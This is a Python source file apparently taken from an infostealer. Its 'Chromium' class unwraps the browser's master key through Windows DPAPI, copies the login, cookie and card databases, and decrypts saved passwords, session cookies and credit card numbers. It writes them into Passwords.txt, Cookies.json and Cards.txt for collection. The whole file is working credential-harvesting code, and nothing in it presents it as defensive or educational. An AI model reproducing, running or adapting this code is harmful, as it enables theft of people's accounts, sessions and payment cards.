from sqlite3 import connect
from shutil import copyfile
from base64 import b64decode
from json import loads, dump
from os import path, mkdir, remove
from datetime import datetime, timedelta

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


class Chromium:

    def __init__(self, *args):

        variables = ["browser_name", "storage_path", "storage_folder", "state_path", "cookies_path", "passwords_path", "cards_path", "alt_cookies_path", "statuses", "errors"]

        for index, variable in enumerate(variables):
            self.__dict__.update({variable: args[index]})

    def __check_paths(self):

        if any([path.exists(self.passwords_path), path.exists(self.cookies_path), path.exists(self.alt_cookies_path), path.exists(self.cards_path)]) and any(self.statuses):
            mkdir(f"{self.storage_path}{self.storage_folder}{self.browser_name}")

    def __get_datetime(self, date):

        if date != 86400000000 and date:
            return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
        else:
            return ""

    def __get_key(self):

        with open(self.state_path, "r", encoding="utf-8") as state:
            return CryptUnprotectData(b64decode(loads(state.read())["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]

    def __decrypt(self, buff, master_key):

        try:
            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Can't decode"

    def __write_passwords(self, cursor, master_key):

        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/Passwords.txt", "a", encoding="utf-8") as passwords:
            for result in cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall():

                password = self.__decrypt(result[2], master_key)

                if any(filter(lambda item: item != "", [result[0], result[1], password])):
                    passwords.write(f"URL: {result[0]}\nUsername: {result[1]}\nPassword: {password}\n\n")

        passwords.close()

    def __write_cookies(self, cursor, master_key):

        results = []

        for result in cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies").fetchall():

            if not result[2]:
                decrypted_value = self.__decrypt(result[6], master_key)
            else:
                decrypted_value = result[2]

            if any([bool(item) for item in result] + [bool(decrypted_value)]):
                results.append({
                    "host": result[0],
                    "name": result[1],
                    "value": decrypted_value,
                    "creation_datetime": self.__get_datetime(result[3]),
                    "last_access_datetime": self.__get_datetime(result[4]),
                    "expires_datetime": self.__get_datetime(result[5])
                })

        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/Cookies.json", "a", encoding="utf-8") as cookies:

            dump(results, cookies)

        cookies.close()

    def __write_cards(self, cursor, master_key):

        with open(f"{self.storage_path}{self.storage_folder}/{self.browser_name}/Cards.txt", "a", encoding="utf-8") as cards:
            for result in cursor.execute("SELECT * FROM credit_cards").fetchall():

                password = self.__decrypt(result[4], master_key)

                if any(filter(lambda item: item != "", [result[1], result[2], result[3], password])):
                    cards.write(f"Username: {result[1]}\nNumber: {password}\nExpire Month: {result[2]}\nExpire Year: {result[3]}\n\n")

        cards.close()

    def __check_all(self):

        items = (
            {
                "status": self.statuses[0],
                "name": "Passwords",
                "path": self.passwords_path,
                "alt_path": None,
                "method": self.__write_passwords,
                "error": "No passwords found"
            },
            {
                "status": self.statuses[1],
                "name": "Cookies",
                "path": self.cookies_path,
                "alt_path": self.alt_cookies_path,
                "method": self.__write_cookies,
                "error": "No cookies found"
            },
            {
                "status": self.statuses[2],
                "name": "Cards",
                "path": self.cards_path,
                "alt_path": None,
                "method": self.__write_cards,
                "error": "No cards found"
            }
        )

        for item in items:

            try:

                if item["status"] is True:

                    if (path.exists(item["path"])) is True:
                        copyfile(item["path"], f'{self.storage_path}{self.browser_name} {item["name"]}.db')

                    elif item["alt_path"] is not None and (path.exists(item["alt_path"])):
                        copyfile(item["alt_path"], f'{self.storage_path}{self.browser_name} {item["name"]}.db')

                    else:
                        if self.errors is True:
                            print(f'[{self.browser_name.upper()}]: {item["error"]}')
                        return

                    with connect(f'{self.storage_path}{self.browser_name} {item["name"]}.db') as connection:
                        connection.text_factory = lambda text: text.decode(errors="ignore")
                        cursor = connection.cursor()
                        item["method"](cursor, self.__get_key())
                        cursor.close()

                    connection.close()
                    remove(f'{self.storage_path}{self.browser_name} {item["name"]}.db')

            except Exception as e:

                if self.errors is True:
                    print(f"[{self.browser_name.upper()}]: {repr(e)}")

    def run(self):

        try:

            self.__check_paths()
            self.__check_all()

        except Exception as e:

            if self.errors is True:
                print(f"[{self.browser_name.upper()}]: {repr(e)}")
